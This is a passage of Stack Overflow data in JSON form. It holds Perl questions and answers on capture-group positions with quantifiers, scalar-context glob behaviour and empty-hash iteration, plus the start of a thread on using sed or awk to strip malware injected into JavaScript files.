"reply_to_user": {"reputation": 6728, "user_id": 2156952, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/3mMoE.gif?s=128&g=1", "display_name": "TrueY", "link": "https://stackoverflow.com/users/2156952/truey"}, "edited": false, "score": 0, "creation_date": 1485983022, "post_id": 41986055, "comment_id": 71156754, "body": "My point seems to haven&#39;t come across: If the match as a whole fails, the captured positions are probably not what you&#39;re looking for. Or am I missing something?"}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1485985612, "post_id": 41986055, "comment_id": 71157951, "body": "That still uses <code>(?{ })</code> which the question specifically asks to remove. And if you&#39;re going to use <code>(?{ })</code>, you&#39;re doing it all wrong -- backtracking doesn&#39;t remove matches you&#39;ve stored. You gotta use <code>$^R</code> (and you should be using <code>$^N</code> instead of that complicated expression)."}, {"owner": {"reputation": 251, "user_id": 7095760, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1075cc785326ad3cb890f95b3446009e?s=128&d=identicon&r=PG&f=1", "display_name": "SREagle", "link": "https://stackoverflow.com/users/7095760/sreagle"}, "edited": false, "score": 0, "creation_date": 1485995025, "post_id": 41986055, "comment_id": 71161582, "body": "That backtracking doesn&#39;t remove the stored subpattern matches is EXACTLY what I repeatedly tried to say here, but thanks for repating it, maybe the rephrasing let&#39;s it get understood! And the usage of <code>(?{ })</code>isn&#39;t specifically be asked to be removed - the OP tries it himself for solving his problem - so I gave it another shot. If you like, you can demonstrate your $^R / $^N approach in an extra section - I&#39;m always willing to learn."}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1485998830, "post_id": 41986055, "comment_id": 71162648, "body": "Re &quot;<i>And the usage of (?{ })isn&#39;t specifically be asked to be removed</i>&quot;, Look again, the question is for a better alternative than inserting <code>(?:{ })</code>. They have since re-asserted that by saying they want something that works for any RE."}, {"owner": {"reputation": 251, "user_id": 7095760, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1075cc785326ad3cb890f95b3446009e?s=128&d=identicon&r=PG&f=1", "display_name": "SREagle", "link": "https://stackoverflow.com/users/7095760/sreagle"}, "edited": false, "score": 0, "creation_date": 1486000527, "post_id": 41986055, "comment_id": 71163038, "body": "If you look at it that way, you&#39;re right. I mistook the problem to solve for the first 7 lines. Starting with &quot;Simple matching gives:&quot; is for me a number of his tries at a solution for his stated problem, and I saw it as invitation to improve on them. That seems to be a &quot;no-go&quot; for you. And my approach specifically restricts the usage to REs NOT involving foreseeable backtracking. If this helps him in any way, this would bring him closer to solving his problem than none at all. If not, he does not have to do anything with it, so where&#39;s the harm?"}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1486002054, "post_id": 41986055, "comment_id": 71163412, "body": "Re &quot;<i>And my approach specifically restricts the usage to REs NOT involving foreseeable backtracking.</i>&quot;, Which a fancy way of saying it almost never works. For example, it doesn&#39;t work if you remove the <code>^</code>."}, {"owner": {"reputation": 251, "user_id": 7095760, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1075cc785326ad3cb890f95b3446009e?s=128&d=identicon&r=PG&f=1", "display_name": "SREagle", "link": "https://stackoverflow.com/users/7095760/sreagle"}, "edited": false, "score": 0, "creation_date": 1486025786, "post_id": 41986055, "comment_id": 71172245, "body": "That&#39;s correct. Although the <code>^</code> example isn&#39;t the best: For determining the positions in the string to match - his problem to solve - anchoring it to the start is kind of the point. That&#39;s why half of his tries and your first four use it too, I guess. Anyway: Thumbs (and vote) up for your last examples!"}], "tags": [], "owner": {"reputation": 251, "user_id": 7095760, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1075cc785326ad3cb890f95b3446009e?s=128&d=identicon&r=PG&f=1", "display_name": "SREagle", "link": "https://stackoverflow.com/users/7095760/sreagle"}, "is_accepted": false, "score": 0, "last_activity_date": 1485981190, "last_edit_date": 1485981190, "creation_date": 1485970403, "answer_id": 41986055, "question_id": 41981960, "link": "https://stackoverflow.com/questions/41981960/how-to-get-the-position-of-all-capture-groups-with-quantifiers/41986055#41986055", "title": "How to get the position of all capture groups with quantifiers?", "body": "<p>I think I can give some explanation for the behavior you see:</p>\n\n<p>In the first example I can see only one capture group. The quantifier allows it to be used multiple times, but it's one capture group nonetheless. So every new occurence of a matching subpattern would overwrite the value previously captured there. Even if the RE engine is already advanced behind it, but backtracking would occur (for e.g. a more advanced pattern with branching and the likes), it could be that the now again visited capture group would change. And since <code>@-</code> and <code>@+</code> hold the positions to the capture groups (as opposed to occuring subpattern matches), this would explain why there's only the last occurence of the subpattern contained.</p>\n\n<p>You could even play around with named subpatterns and <code>%+</code>/<code>%-</code> and would experience the same thing. It becomes more obvious with the already used <code>(?{ })</code>, at least for debugging purposes. But <code>use re 'debug'</code> is fine for shorter regexes / strings to match.</p>\n\n<p>So be aware of the effects of backtracking to capture groups while matching is still in progress!</p>\n\n<p>But if you don't have to care about backtracking, I can think of kind of a recipe to handle a capture group with a quantifier:</p>\n\n<p>If your capture group is <code>(bla)</code> and your quantifier <code>{0,3}</code>, transform it into</p>\n\n<p><code>(?:(bla)(?{ print $-[$#-],$+[$#-].\"\\n\" })){0,3}</code>.</p>\n\n<p>You practically put the subpattern into another (non-capturing) group. If the RE engine is done with it, execute code regarding the last capture group matched so far. The quantifier outside the surrounding group is then responsible for the correct number of execution of the code fragment.</p>\n\n<p>So you example becomes this:</p>\n\n<pre><code>use Data::Dumper;\nmy $s = 'xx1a2b3cyy';\nmy @submatches;\nsub getem { push @submatches, [$-[$#-],$+[$#-]]; }\n$s =~ m/^xx(?:(\\d\\w)(?{ getem() }))+/;\nprint Dumper(\\@submatches);\n</code></pre>\n\n<p>This also works with multiple capture groups transformed this way:</p>\n\n<pre><code>my $s = 'xx1a2b3cyy4de5fg6hihhh2';\n$s =~ m/^xx(?:(\\d\\w)(?{ getem() }))+yy(?:(\\d\\w{2})(?{ getem() }))+hh/;\n</code></pre>\n\n<p>You have to adjust the index used, if your capture group contains more capture groups. That's why I prefer names capture groups.</p>\n\n<p>Hope this helps.</p>\n"}], "owner": {"reputation": 6728, "user_id": 2156952, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/3mMoE.gif?s=128&g=1", "display_name": "TrueY", "link": "https://stackoverflow.com/users/2156952/truey"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 256, "favorite_count": 0, "answer_count": 2, "score": 2, "last_activity_date": 1486004130, "creation_date": 1485958601, "last_edit_date": 1485958936, "question_id": 41981960, "link": "https://stackoverflow.com/questions/41981960/how-to-get-the-position-of-all-capture-groups-with-quantifiers", "title": "How to get the position of all capture groups with quantifiers?", "body": "<p>I have a small problem. I have a <a href=\"/questions/tagged/perl\" class=\"post-tag\" title=\"show questions tagged &#39;perl&#39;\" rel=\"tag\">perl</a> <a href=\"/questions/tagged/regexp\" class=\"post-tag\" title=\"show questions tagged &#39;regexp&#39;\" rel=\"tag\">regexp</a> with multiple capture groups. Some of them have quantifiers (like '<code>+</code>'). If no quantifier is added, then <code>@-</code> &amp; <code>@+</code> array are filled nicely with the matched position of the capture groups, but if a quantifier is added only the last match is detected. But I would like to have all of them.</p>\n\n<p>An example:</p>\n\n<pre><code>my $s = 'xx1a2b3cyy';\nmy $re = qr/^xx(\\d\\w)+/;\n</code></pre>\n\n<p>So I'd like to know that matches are <code>'1a', '2b', '3c'</code> at 2, 4, 6.</p>\n\n<p>Simple matching gives:</p>\n\n<pre><code>if ($s =~ $re) {\n  print \"Match @-, @+\\n\";\n  for (my $i = 0; $i &lt; @-; ++$i) {\n    print 'i: ', $i, \" - '\", substr($s, $-[$i], $+[$i] - $-[$i]), \"\\n\";\n  }\n}\n</code></pre>\n\n<p>Gives:</p>\n\n<pre><code>Match 0 6, 8 8\ni: 0 - 'xx1a2b3c\ni: 1 - '3c\n</code></pre>\n\n<p>So only the last capture group match is remembered.</p>\n\n<p>My next simple try was which is not really what I want as the RE is different:</p>\n\n<pre><code>$re = qr/(\\d\\w)/;\nmy @s = ($s =~ /$re/g);\nprint \"RE: '@s'\\n\";\nwhile ($s =~ /$re/g) {\n  print \"Match @-, @+\\n\";\n  for (my $i = 0; $i &lt; @-; ++$i) {\n    print 'i: ', $i, \" - '\", substr($s, $-[$i], $+[$i] - $-[$i]), \"\\n\";\n  }\n}\n</code></pre>\n\n<p>gives:</p>\n\n<pre><code>RE: '1a 2b 3c'\nMatch 2 2, 4 4\ni: 0 - '1a\ni: 1 - '1a\nMatch 4 4, 6 6\ni: 0 - '2b\ni: 1 - '2b\nMatch 6 6, 8 8\ni: 0 - '3c\ni: 1 - '3c\n</code></pre>\n\n<p>But this not what I want, as it would match a string like <code>'ZZ1aAA2bBB3cZZ'</code>.</p>\n\n<p>So somehow I have to combine the two. The best what I could get:</p>\n\n<pre><code>$re = '^xx(?:\\d\\w)*?\\G(\\d\\w)';\npos($s) = 2;\nwhile ($s =~ m($re)g) {\n  print \"Match pos: \", pos($s), ', G: ', $1, \", '@-', '@+'\\n\"\n}\n</code></pre>\n\n<p>gives:</p>\n\n<pre><code>Match pos: 4, G: 1a, '0 2', '4 4'\nMatch pos: 6, G: 2b, '0 4', '6 6'\nMatch pos: 8, G: 3c, '0 6', '8 8'\n</code></pre>\n\n<p>This is almost nice, but for this I need to know the position of the first possible match. If it is not set properly it will not match anything. I can only determine the first position if I remove the non greedy part:</p>\n\n<pre><code>$re = '^xx(\\d\\w)';\nif ($s =~ m($re)) {\n  print \"Match: '@-', '@+'\\n\";\n}\n</code></pre>\n\n<p>which gives:</p>\n\n<pre><code>Match: '0 2', '4 4'\n</code></pre>\n\n<p>So <code>$-[1]</code> gives the first position, but for this I have to modify the RE \"manually\".</p>\n\n<p>If I add code execution into the pattern I almost get what I need:</p>\n\n<pre><code>use re 'eval';\n$re = '^xx(\\d\\w)+(??{print \"Code: &lt;@-&gt; &lt;@+&gt;\\n\"})';\n$s =~ m($re) and print \"Match\\n\";\n</code></pre>\n\n<p>gives:</p>\n\n<pre><code>Code: &lt;0 6&gt; &lt;8 8&gt;\nCode: &lt;0 4&gt; &lt;6 6&gt;\nCode: &lt;0 2&gt; &lt;4 4&gt;\n</code></pre>\n\n<p>For this I need to add the <code>(?{ code })</code> part.</p>\n\n<p>Does anybody know a simpler method (I mean not need to modify the original RE) to get all the possible matches of a capture group having a quantifier?</p>\n\n<p>Thanks in advance!</p>\n"}, {"tags": ["perl", "glob"], "comments": [{"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1485959404, "post_id": 41981927, "comment_id": 71142180, "body": "It this <code>CORE::glob</code> or <code>:bsd_glob</code> from <a href=\"http://perldoc.perl.org/File/Glob.html\" rel=\"nofollow noreferrer\">perldoc.perl.org/File/Glob.html</a>?"}, {"owner": {"reputation": 1640, "user_id": 4273851, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/24f0896e35ca5cf36f0b6b4ec2aeec34?s=128&d=identicon&r=PG&f=1", "display_name": "A.D", "link": "https://stackoverflow.com/users/4273851/a-d"}, "edited": false, "score": 0, "creation_date": 1485959509, "post_id": 41981927, "comment_id": 71142266, "body": "The requests come from our iOS app. So there is some delay between the code that runs. To run it 3 times takes around 5 seconds."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1485976595, "post_id": 41981927, "comment_id": 71153229, "body": "Assigning the result of <code>glob</code> to an array will fix this, and it&#39;s highly likely that you&#39;ll want to know the names of the files as well as just whether they exist."}], "answers": [{"comments": [{"owner": {"reputation": 1640, "user_id": 4273851, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/24f0896e35ca5cf36f0b6b4ec2aeec34?s=128&d=identicon&r=PG&f=1", "display_name": "A.D", "link": "https://stackoverflow.com/users/4273851/a-d"}, "edited": false, "score": 0, "creation_date": 1485960600, "post_id": 41982516, "comment_id": 71142983, "body": "Wow. That is some really wierd code. I tried it though. And it worked just the way I wanted it to. Thanks!"}, {"owner": {"reputation": 110113, "user_id": 168657, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/f14e7610fca39322ebbf23530def15f8?s=128&d=identicon&r=PG", "display_name": "mob", "link": "https://stackoverflow.com/users/168657/mob"}, "reply_to_user": {"reputation": 1640, "user_id": 4273851, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/24f0896e35ca5cf36f0b6b4ec2aeec34?s=128&d=identicon&r=PG&f=1", "display_name": "A.D", "link": "https://stackoverflow.com/users/4273851/a-d"}, "edited": false, "score": 0, "creation_date": 1485961482, "post_id": 41982516, "comment_id": 71143624, "body": "There&#39;s some good discussion on scalar glob at <a href=\"http://stackoverflow.com/questions/2633447/why-doesnt-perl-file-glob-work-outside-of-a-loop-in-scalar-context\">this question</a>."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 1, "creation_date": 1485976233, "post_id": 41982516, "comment_id": 71153033, "body": "Using symbolic identifiers like that is discouraged because they are reserved for Perl built-in variables. It is also highly inconsiderate to write code using undefined symbolic variables with spaces in unusual places, as most Perl programmers will be unable to parse it quickly. The obvious way to check the existence of files matching a <code>glob</code> pattern is with <code>if ( my @files = glob &#39;aaa:*&#39; ) { ... }</code> where the array <code>@files</code> is defined only for the length of the <code>if</code> block. &quot;secret operators&quot; are mostly infantile toys rather than valid constructs for use in production software"}], "tags": [], "owner": {"reputation": 110113, "user_id": 168657, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/f14e7610fca39322ebbf23530def15f8?s=128&d=identicon&r=PG", "display_name": "mob", "link": "https://stackoverflow.com/users/168657/mob"}, "is_accepted": true, "score": 3, "last_activity_date": 1485973928, "last_edit_date": 1485973928, "creation_date": 1485960229, "answer_id": 41982516, "question_id": 41981927, "link": "https://stackoverflow.com/questions/41981927/perl-glob-check-if-file-with-prefix-exists/41982516#41982516", "title": "perl glob check if file with prefix exists", "body": "<p><code>if (glob(...))</code> is a <a href=\"http://metacpan.org/pod/perlfunc#glob\" rel=\"nofollow noreferrer\">call to <code>glob</code> in scalar context</a>.</p>\n\n<blockquote>\n  <p>In scalar context, glob iterates through\n  such filename expansions, returning undef when the list is\n  exhausted.</p>\n</blockquote>\n\n<p>So everytime you call <code>glob</code> in scalar context, with the same arguments, and <em>from the same line of code</em>, you will get a different result, and eventually you will get <code>undef</code> when the list of files that match your argument are exhausted. </p>\n\n<p>To get your expression to mean \"if there are files that match this pattern ...\", you need to use list context somehow.</p>\n\n<pre><code>@tmp = glob(pattern)\nif (@tmp) \n\nif (()=glob(pattern))\n\nif (@{[glob(pattern)]})\n</code></pre>\n\n<p><hr>Diversion: any of these also work (because <code>@*</code> are valid global array identifiers for many values of punctuation character <code>*</code>)</p>\n\n<pre><code>if (@@=glob(pattern))\nif (@&lt;=glob(pattern))\nif (@:=glob(pattern))\n</code></pre>\n\n<p>and they can even be written like</p>\n\n<pre><code>if (@ &lt;= glob(pattern))\nif (@ := glob(pattern))\n</code></pre>\n\n<p>and so a few more candidates for <a href=\"https://metacpan.org/pod/perlsecret\" rel=\"nofollow noreferrer\">secret operators</a> are suggested.</p>\n\n<pre><code>@@ = EXPR       like the goatse operator, returns a count of elements\n@ &lt;= EXPR       in EXPR when EXPR is evaluated in list context; useful\n@ := EXPR       when EXPR in scalar context does not do this\n</code></pre>\n"}], "owner": {"reputation": 1640, "user_id": 4273851, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/24f0896e35ca5cf36f0b6b4ec2aeec34?s=128&d=identicon&r=PG&f=1", "display_name": "A.D", "link": "https://stackoverflow.com/users/4273851/a-d"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 396, "favorite_count": 0, "accepted_answer_id": 41982516, "answer_count": 1, "score": 0, "last_activity_date": 1485973928, "creation_date": 1485958503, "last_edit_date": 1485959007, "question_id": 41981927, "link": "https://stackoverflow.com/questions/41981927/perl-glob-check-if-file-with-prefix-exists", "title": "perl glob check if file with prefix exists", "body": "<p>I get some strange behaviour searching for files using <code>glob</code>.\n(I think its intended, but I don't want it in my case)</p>\n\n<p>I have 2 files named <code>aaa:bbb</code> and <code>aaa:ccc</code>.</p>\n\n<p>I have code to see if files with prefix <code>aaa:*</code> exists. I do this with this code:</p>\n\n<pre><code>my $filelocation_special = \"aaa\";\n\nif (glob($filelocation_special . \":*\")) {\n  # file(s) exists!\n}\n</code></pre>\n\n<p>This works. However, if I run the same code again two more times glob returns undefined.</p>\n\n<p>these are my returns: (most of the time anyway)</p>\n\n<pre><code>print STDERR \"glob: \" . glob($filelocation_special . \":*\") . \"\\n\";\n\n# 1 run: aaa:bbb\n# 2 run: aaa:ccc\n# 3 run: \n</code></pre>\n\n<p>What can I do to <em>reset</em> <code>glob</code>to always just check if files with this prefix exists?</p>\n\n<p>Maybe I should use some different check altogether, but I can't seem to find anything that is fast and just checks if the files exists.</p>\n"}, {"tags": ["perl", "hash", "is-empty"], "comments": [{"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "reply_to_user": {"reputation": 82895, "user_id": 372239, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/2twLb.jpg?s=128&g=1", "display_name": "Toto", "link": "https://stackoverflow.com/users/372239/toto"}, "edited": false, "score": 1, "creation_date": 1485956969, "post_id": 41981313, "comment_id": 71140488, "body": "@Toto I think the question is why there is no <code>item_2 =&gt; 0</code>."}, {"owner": {"reputation": 82895, "user_id": 372239, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/2twLb.jpg?s=128&g=1", "display_name": "Toto", "link": "https://stackoverflow.com/users/372239/toto"}, "reply_to_user": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1485957105, "post_id": 41981313, "comment_id": 71140596, "body": "@simbabque: OK, I misunderstood :("}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1485968690, "post_id": 41981313, "comment_id": 71148703, "body": "If there are X keys over which to iterate, then there are X iterations of the loop. Yes, this applies even when X is zero. Your &quot;workaround&quot; is actually the proper way of handling the situation."}], "answers": [{"tags": [], "owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "is_accepted": true, "score": 4, "last_activity_date": 1485956945, "creation_date": 1485956945, "answer_id": 41981419, "question_id": 41981313, "link": "https://stackoverflow.com/questions/41981313/why-checking-if-the-hash-is-empty-fails/41981419#41981419", "title": "Why checking if the hash is empty fails?", "body": "<p>If there are no keys in a hash then <code>keys</code> returns an empty list <code>()</code>. When you iterate with <code>foreach</code> over an empty list, the body of the loop will never be called. So your <code>print \"HERE\"</code> will never be reached. This is correct.</p>\n\n<pre><code>foreach (()) {\n    print \"foo\";\n}\n\n__END__\n(no output)\n</code></pre>\n\n<p>Perl's <em>auto-vivification</em> creates values in a hash for you when you use them the first time, and values start out as <code>0</code> when you do math on them. That's why you can add and substract from them in your loop inside the conditions.</p>\n\n<p>To make it work, you've already done the right thing with your commented out line.</p>\n\n<pre><code>foreach my $signal (sort keys %{$items{$item}}){\n    $signals{$item} = 0;\n    if ( ...\n</code></pre>\n\n<p>Now you initialize every key to <code>0</code> first. That does the same doing it implicitly as described above, it just does it every time.</p>\n"}], "owner": {"reputation": 309, "user_id": 2964417, "user_type": "registered", "accept_rate": 47, "profile_image": "https://www.gravatar.com/avatar/b5c71d859d620825097c7d6bbeef6afa?s=128&d=identicon&r=PG", "display_name": "MeirG", "link": "https://stackoverflow.com/users/2964417/meirg"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 83, "favorite_count": 0, "accepted_answer_id": 41981419, "answer_count": 1, "score": 0, "last_activity_date": 1485958093, "creation_date": 1485956594, "last_edit_date": 1495541801, "question_id": 41981313, "link": "https://stackoverflow.com/questions/41981313/why-checking-if-the-hash-is-empty-fails", "title": "Why checking if the hash is empty fails?", "body": "<p>There are many references as to how to <a href=\"https://stackoverflow.com/questions/9444915/how-to-check-if-a-hash-is-empty-in-perl\">check if a hash is empty</a>. I tried them all in the following script: </p>\n\n<pre><code>use strict;\nuse warnings;\nuse Data::Dumper;\n   $Data::Dumper::Sortkeys = 1;\n\n# Signals come...\nmy %items = (\n    item_1 =&gt; {signal_1 =&gt; 'up',\n               signal_2 =&gt; 'down',\n               signal_3 =&gt; 'up',\n              },\n    item_2 =&gt; {signal_1 =&gt; 'down',\n              },\n    item_3 =&gt; {signal_1 =&gt; 'up',\n               signal_3 =&gt; 'down',\n               signal_4 =&gt; 'down',\n               signal_5 =&gt; 'down',\n              },\n  );\n\n# ... and signals go:\ndelete $items{'item_2'}-&gt;{'signal_1'};\n# and sometimes all signals are gone from an item:\nprint Dumper(\\%items);\n# in that case we would like the signal count to show 0 (zero).\nmy %signals;\nforeach my $item (sort keys %items){\n  #$signals{$item} = 0;\n  foreach my $signal (sort keys %{$items{$item}}){\n    if   (not %{$items{$item}}) {print \"HERE\\n\"; $signals{$item} = 0}\n    elsif($items{$item}-&gt;{$signal} eq 'up')  {$signals{$item}++}\n    elsif($items{$item}-&gt;{$signal} eq 'down'){$signals{$item}--}\n  }\n}\n# unfortunately the item disappears completely!\nprint Dumper(\\%signals);\n</code></pre>\n\n<p>It seems the iterator skips over the empty hash completely. My only way to produce a correct result was to initiate each count to zero (commented out) and let it be incremented/decremented by non-empty hashes.</p>\n\n<p>Why is it...???</p>\n"}, {"tags": ["regex", "perl", "awk", "sed"], "comments": [{"owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "edited": false, "score": 3, "creation_date": 1485956340, "post_id": 41981202, "comment_id": 71140018, "body": "Looks like an XY problem. What are you trying to accomplish?"}, {"owner": {"reputation": 45, "user_id": 7500639, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d70566440e569d78678fc08630ab63ac?s=128&d=identicon&r=PG&f=1", "display_name": "Iamtheroot", "link": "https://stackoverflow.com/users/7500639/iamtheroot"}, "reply_to_user": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "edited": false, "score": 0, "creation_date": 1485956432, "post_id": 41981202, "comment_id": 71140076, "body": "it&#39;s a malware injected to java-scripts and I want to remove this malware from every file."}, {"owner": {"reputation": 917, "user_id": 3014263, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/rFh51.jpg?s=128&g=1", "display_name": "AbhiNickz", "link": "https://stackoverflow.com/users/3014263/abhinickz"}, "edited": false, "score": 0, "creation_date": 1485956458, "post_id": 41981202, "comment_id": 71140096, "body": "<a href=\"http://perldoc.perl.org/functions/quotemeta.html\" rel=\"nofollow noreferrer\">look into quotemeta \\Q \\E</a>"}, {"owner": {"reputation": 917, "user_id": 3014263, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/rFh51.jpg?s=128&g=1", "display_name": "AbhiNickz", "link": "https://stackoverflow.com/users/3014263/abhinickz"}, "edited": false, "score": 0, "creation_date": 1485956631, "post_id": 41981202, "comment_id": 71140224, "body": "I guess this <a href=\"http://stackoverflow.com/questions/29613304/is-it-possible-to-escape-regex-metacharacters-reliably-with-sed\">link</a> contains very detailed answer."}, {"owner": {"reputation": 132964, "user_id": 171318, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/ePRKy.jpg?s=128&g=1", "display_name": "hek2mgl", "link": "https://stackoverflow.com/users/171318/hek2mgl"}, "edited": false, "score": 0, "creation_date": 1485957094, "post_id": 41981202, "comment_id": 71140586, "body": "It&#39;s definitely and reliably possible. I&#39;ve asked that question a time ago. Check that: <a href=\"https://stackoverflow.com/questions/29613304/is-it-possible-to-escape-regex-metacharacters-reliably-with-sed\" title=\"is it possible to escape regex metacharacters reliably with sed\">stackoverflow.com/questions/29613304/&hellip;</a>"}, {"owner": {"reputation": 132964, "user_id": 171318, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/ePRKy.jpg?s=128&g=1", "display_name": "hek2mgl", "link": "https://stackoverflow.com/users/171318/hek2mgl"}, "edited": false, "score": 0, "creation_date": 1485957213, "post_id": 41981202, "comment_id": 71140670, "body": "PS: If <code>var _0xaae8</code> is a constant, you might simply use <code>sed &#47;var _0xaae8&#47;d</code>"}, {"owner": {"reputation": 45, "user_id": 7500639, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d70566440e569d78678fc08630ab63ac?s=128&d=identicon&r=PG&f=1", "display_name": "Iamtheroot", "link": "https://stackoverflow.com/users/7500639/iamtheroot"}, "edited": false, "score": 0, "creation_date": 1485983434, "post_id": 41981202, "comment_id": 71156961, "body": "it&#39;s a constant but  i don&#39;t want to remove the complete line but just remove the pattern only."}], "answers": [{"comments": [{"owner": {"reputation": 45, "user_id": 7500639, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d70566440e569d78678fc08630ab63ac?s=128&d=identicon&r=PG&f=1", "display_name": "Iamtheroot", "link": "https://stackoverflow.com/users/7500639/iamtheroot"}, "edited": false, "score": 0, "creation_date": 1486003094, "post_id": 41991966, "comment_id": 71163669, "body": "Thanks. That looks promising.  Also how do  we update the changes via awk  to the file ? like sed -i ?"}, {"owner": {"reputation": 45, "user_id": 7500639, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d70566440e569d78678fc08630ab63ac?s=128&d=identicon&r=PG&f=1", "display_name": "Iamtheroot", "link": "https://stackoverflow.com/users/7500639/iamtheroot"}, "edited": false, "score": 0, "creation_date": 1486004514, "post_id": 41991966, "comment_id": 71164042, "body": "I am using gawk-4.0.2-4.el7.x86_64 so doesn&#39;t look like in-place is not an option."}, {"owner": {"reputation": 5253, "user_id": 1534218, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a029fd63aaec1fbb0f0b2b81617f12a8?s=128&d=identicon&r=PG", "display_name": "slitvinov", "link": "https://stackoverflow.com/users/1534218/slitvinov"}, "reply_to_user": {"reputation": 45, "user_id": 7500639, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d70566440e569d78678fc08630ab63ac?s=128&d=identicon&r=PG&f=1", "display_name": "Iamtheroot", "link": "https://stackoverflow.com/users/7500639/iamtheroot"}, "edited": false, "score": 0, "creation_date": 1486153471, "post_id": 41991966, "comment_id": 71239362, "body": "To make it work in-place I would make an adapter shell script: <code>&lt;replace command&gt; &quot;$1&quot; &gt; &#47;tmp&#47;t.file &amp;&amp; mv &#47;tmp&#47;t.file &quot;$1&quot;</code>"}], "tags": [], "owner": {"reputation": 5253, "user_id": 1534218, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a029fd63aaec1fbb0f0b2b81617f12a8?s=128&d=identicon&r=PG", "display_name": "slitvinov", "link": "https://stackoverflow.com/users/1534218/slitvinov"}, "is_accepted": true, "score": 2, "last_activity_date": 1486153504, "last_edit_date": 1486153504, "creation_date": 1485992805, "answer_id": 41991966, "question_id": 41981202, "link": "https://stackoverflow.com/questions/41981202/replacing-a-complex-pattern-using-sed/41991966#41991966", "title": "replacing a complex pattern using sed", "body": "<pre><code>$ cat r.awk\n#!/usr/bin/awk -f\n\nNR == FNR { # read a first file with a string to match\n    str = $0\n    rep = \" \" 